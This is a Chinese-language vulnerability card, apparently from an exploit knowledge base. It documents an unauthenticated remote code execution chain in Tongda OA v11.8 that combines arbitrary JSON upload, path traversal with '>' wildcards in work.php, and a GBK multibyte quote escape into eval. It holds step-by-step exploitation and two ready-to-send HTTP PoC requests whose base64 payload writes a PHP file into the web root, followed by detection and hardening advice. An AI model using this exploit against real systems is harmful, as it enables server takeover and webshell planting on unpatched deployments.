---
id: web-php-rce-tongda-oa-api-ali-upload-work-php-json-eval-iconv
title: 通达OA v11.8 前台 api.ali.php 任意文件上传 + work.php 通配符路径穿越解析 JSON，iconv 宽字节逃逸单引号 eval 执行
type: scenario
domain: web
path: web/php/rce
technique: tongda-oa-api-ali-upload-work-php-json-eval-iconv
aliases:
- api.ali.php
- work.php
- acceptData
- backDataAnalysis
- AllVariableBusinessProcessing
- 通达OA 前台文件上传
- 通达OA 前台 RCE
- file_get_contents 通配符
- MYOA_ATTACH_NAME_FORMAT
tags:
- php
- oa
- tongda
- file-upload
- path-traversal
- file-get-contents
- eval
- iconv
- encoding-bypass
- unauth
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: v11.8
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V628
  verified_at: '2026-11-12T23:38:11+08:00'
  notes: 已对照原文全文与19张截图核对：图01 api.ali.php仅include conn/api.api.class/utility_file无鉴权；图02 upload()的filename_valid与is_uploadable后缀黑名单；图03-04 add_attach、MYOA_ATTACH_NAME_FORMAT为false、mt_rand()文件名；图05-07 work.php取GET id→acceptData→analysisJson file_get_contents+json_decode→backData；图08-11 backDataAnalysis流程、test.php双层dataAnalysis与var_export+iconv(UTF-8,GBK)结果。原文标题与'影响版本'明确写v11.8，keep affected_versions=v11.8。原文称錦GBK为B0 A1有误，本机验证U+9326编码为E5 5C（card已注明并解释0x5C吃掉转义反斜杠），保留card修正。补充说明：原文PoC为11个%3E（当时随机数10位），card用10个（本机9位随机数实测），已在变体节写明按位数+1增减。dedup recommendation=new，top候选为信呼OA/泛诺CMS/Yii saveupload等不同产品链，库内无其他通达同链卡；与本篇getdata卡为同版本不同入口/不同sink，互引变体不重复。19张图全部读取无失败。
---

## 一句话结论

通达OA v11.8 的 `/mobile/api/api.ali.php` 上传接口只用后缀黑名单拦截可执行文件，未登录即可把任意 `.json` 文本落到 `attach/approve_center/<年月>/<9位随机数>.<原名>`；随后同样无鉴权的 `/inc/package/work.php?id=...` 用 `../` 路径穿越加 `>` 单字符通配符绕过未知随机文件名，`file_get_contents` 读回该 JSON，`AllVariableBusinessProcessing::backDataAnalysis()` 把 `dataAnalysis` 二次 `json_decode` 后经 `var_export` + `iconv("UTF-8","GBK")` 再 `eval`，`錦` 的 GBK 尾字节 0x5C 吃掉转义反斜杠使单引号逃逸，执行注入的 PHP 代码（如 `file_put_contents` 写 WebShell）。

## 原理

- **上传侧无鉴权、后缀黑名单**：`mobile/api/api.ali.php` 只 include `inc/conn.php`、`inc/td_ali/api.api.class.php`、`inc/utility_file.php`（配置与通用函数），没有任何登录/权限判断；`$ATTACHMENTS = upload("file", "approve_center")` 进入 `utility_file.php::upload()`，先 `filename_valid()` 规范化文件名，再 `is_uploadable()` 按后缀黑名单拦截 php/php3/php5 等可执行后缀，`.json` 等文本后缀放行。`add_attach()` 中 `$ATTACH_FILE = (MYOA_ATTACH_NAME_FORMAT ? md5($ATTACH_NAME).".td" : $ATTACH_NAME)`，该常量恒为 false，故保留原名；`$ATTACH_ID = mt_rand()`，`$FILENAME = $PATH."/".$ATTACH_ID.".".$ATTACH_FILE`，最终文件名为 `<9位随机数>.<原文件名>`，按上传年月分目录存放。攻击者拿不到随机前缀，但知道唯一的后半截文件名和年月目录。
- **读取侧无鉴权、路径穿越 + 通配符**：`/inc/package/work.php` 直接 `$id = $_GET["id"]` 再 `new DataTransport()->acceptData($id)`；`acceptData()` 里 `$json_file = MYOA_ATTACH_PATH2."/syn/recv/data/".$id."/".$id.".json"`，`$id` 被拼接两次且不过滤 `../`；随后 `analysisJson()` 执行 `file_get_contents($json_file)` 并 `json_decode`。
- **为什么能命中未知随机文件名**：PHP 打开本地文件时，`file_get_contents` 路径中的 `<`、`>` 是单字符通配符（每个匹配任意一个字符），`id` 末段用 10 个 `>`（URL 编码 `%3E`）即可匹配 `9 位随机数 + 点号`；`..` 段从 `attach/syn/recv/data/` 逐级跳出到 attach 根，再进入 `approve_center/<年月>/`。本机 PHP 7.3 实测 `>>>>>>>>>>.fb6790f4.json` 能命中 `123456789.fb6790f4.json`，同一环境下 `*`、`?` 不生效（原文称 Linux 下 `*`、`?` 可用，以文章 PoC 实际使用的 `>`/`<` 为准）。
- **执行侧 eval + iconv 逃逸**：`work.php` 的 `acceptData()` 最终调用 `backData($data)`：按 `$BackData["modular"]` include `inc/package/business/<modular>BusinessProcessing.php`，实例化后调用 `backDataAnalysis($BackData)`；`modular=AllVariable` 即进入 `AllVariableBusinessProcessing`。该方法把 `$BackData["dataAnalysis"]` 先 `json_decode`，再 `eval("return ".iconv("UTF-8","GBK",var_export($variableData,true).";"))`。`dataAnalysis` 因此是“JSON 里再套 JSON”：外层解析后是一段 JSON 文本，内层解码得到数组 `['a'=>"錦',eval(base64_decode($BackData[a])));/*"]`。
- **单引号逃逸为什么成立**：`var_export()` 会把值中的单引号转义为 `\'`（字节 `5C 27`）。`錦`（U+9326）的 UTF-8 是 `E9 8C A6`，经 `iconv("UTF-8","GBK")` 转成 GBK 字节 `E5 5C`，其末字节 `0x5C` 与紧跟的转义反斜杠 `0x5C` 连成合法的 `\\`（转义后的普通反斜杠），单引号 `0x27` 因此失去转义、提前闭合字符串；后面的 `,eval(base64_decode($BackData[a])));` 变成可执行代码，末尾 `/*` 把 var_export 剩余语法注释掉。`$BackData["a"]` 是外层 JSON 的 `a` 字段（base64 编码的任意 PHP 代码），eval 作用域内可直接取到。本机 PHP 7.3 已按同字节复现执行成功。
- **两处细节**：原文把 `錦` 的 GBK 写成 `B0 A1`，实测标准 GBK 为 `E5 5C`（本机 PHP 7.3 iconv 验证），关键在末字节 `0x5C`，机理一致；载荷中 `$BackData[a]` 未加引号，PHP 7 会按未定义常量回退成字符串 `'a'`（有 Warning），PHP 8 会抛 Error，需改写为 `$BackData['a']`。

## 触发条件

- 目标为通达OA v11.8（原文标注影响版本）。
- `/mobile/api/api.ali.php` 与 `/inc/package/work.php` 可未授权访问。
- 上传目录在 Web 根可达的 myoa 目录内，且 Web 根可写（eval 载荷用相对路径写 WebShell）。
- PHP 5/7 环境：eval 载荷里裸常量 `$BackData[a]` 依赖 PHP 8 之前的回退行为。
- 攻击者能预判当前上传年月目录，以拼出 work.php 的 `id`。

## 利用步骤

1. 准备 base64 编码的 PHP 载荷，例如写文件：`file_put_contents('../..//fb6790f4.php','<?php echo vuln_test;?>');` 的 base64 为 `ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIGVjaG8gdnVsbl90ZXN0Oz8+Jyk7`（eval 在 `/inc/package/` 下执行，`../..` 回到 Web 根）。
2. 组装外层 JSON：`modular=AllVariable`，`a` 为上述 base64，`dataAnalysis` 为内层 JSON 文本 `{"a":"錦',eval(base64_decode($BackData[a])));/*"}`（注意外层转义）。
3. `POST /mobile/api/api.ali.php` 以 multipart 上传该 JSON（字段名 `file`，文件名如 `fb6790f4.json`），文件落到 `attach/approve_center/<年月>/<9位随机数>.fb6790f4.json`。
4. `GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/<年月>/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4` 触发读取与 eval；`%3E` 即 `>`，10 个通配符匹配随机数 + 点号，`work.php` 自动补 `.json` 后缀。
5. 访问 `/<写入的文件名>.php` 验证代码执行。

## PoC

```http
POST /mobile/api/api.ali.php HTTP/1.1
Host: <target>
User-Agent: Go-http-client/1.1
Content-Type: multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae

--502f67681799b07e4de6b503655f5cae
Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
Content-Type: application/octet-stream

{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIGVjaG8gdnVsbl90ZXN0Oz8+Jyk7","dataAnalysis":"{\"a\":\"錦',eval(base64_decode($BackData[a])));/*\"}"}

--502f67681799b07e4de6b503655f5cae--
```

```http
GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/2109/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4 HTTP/1.1
Host: <target>
```

## 变体与关联

- 同版本另一条前台命令执行链 [[web-php-rce-tongda-oa-appbuilder-getdata-portal-eval]] 复用了同一编码逃逸思想，但方向相反：那边是 `iconv("GBK","UTF-8")`，用 `0xE5` 引导 `0x5C` 组成 GBK 字符吞掉反斜杠。
- `modular` 字段可选择其它 `*BusinessProcessing` 类；同一 `backDataAnalysis` eval 也可直接执行系统命令、读文件，不限于写 WebShell。
- 通配符可换成 `<`；数量应等于随机数位数 + 1（含点号）——原文 PoC 用 11 个 `%3E`（当时随机数为 10 位），本卡 PoC 用 10 个（本机实测 9 位随机数），实际利用按观察到的位数增减；`id` 中的 `..` 层数按实际部署目录调整。
- 关联：[[web-php-rce-eval-expression-closing-paren-injection]]（eval 拼接被闭合导致代码执行的通用思路）。

## 检测与防御

- 检测：审计 `api.ali.php` 是否被上传 `.json`/非常规后缀；监控 `work.php` 的 `id` 参数含 `../`、`%3E`、`%3C`；关注 attach 目录新增 JSON 后紧跟 `work.php` 访问、Web 根新增 `.php` 文件；代码层排查 `eval` + `iconv` + `var_export` 组合。
- 防御：升级修复版本；`api.ali.php`、`work.php` 增加鉴权；上传改为服务端强制重命名（如恢复 md5 随机名 + 固定后缀）并做内容/类型校验，禁止 Web 根可写；`id` 参数白名单化并 `realpath` 校验路径必须位于允许目录内；移除 `backDataAnalysis` 的 eval，改为安全的 JSON 数据处理。
- 加固：attach 目录禁止 PHP 解析；WAF 拦截路径穿越与通配符组合；定期审计无鉴权的 include/旧接口。
